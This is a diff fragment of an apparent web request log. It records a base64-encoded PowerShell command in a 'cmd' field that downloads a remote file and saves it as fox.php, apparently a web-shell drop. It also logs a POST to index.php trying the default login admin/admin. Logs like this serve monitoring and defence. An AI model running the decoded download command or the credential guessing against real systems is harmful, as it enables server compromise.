@@ -54,3 +54,15 @@ array (
   'cmd' => 'cG93ZXJzaGVsbCAtQ29tbWFuZCAiKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCdodHRwczovL2dvdi5jby52ZS93ZXBxZ3Z1YXN5ay5odG1sJywgJ2ZveC5waHAnKSIgJiYgZWNobyBmb3gucGhw',
 )
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+[12:58 | 27 Jun 2022] 188.0.175.9 : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.160 YaBrowser/22.5.3.684 Yowser/2.5 Safari/537.36
+COOKIE : PHPSESSID=cj0jm9470u5vuusnj9t8d67hps
+POST_/index.php
+array (
+  'uin' => 
+  array (
+    'name' => 'ABC',
+  ),
+  'login' => 'admin',
+  'pass' => 'admin',
+)
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
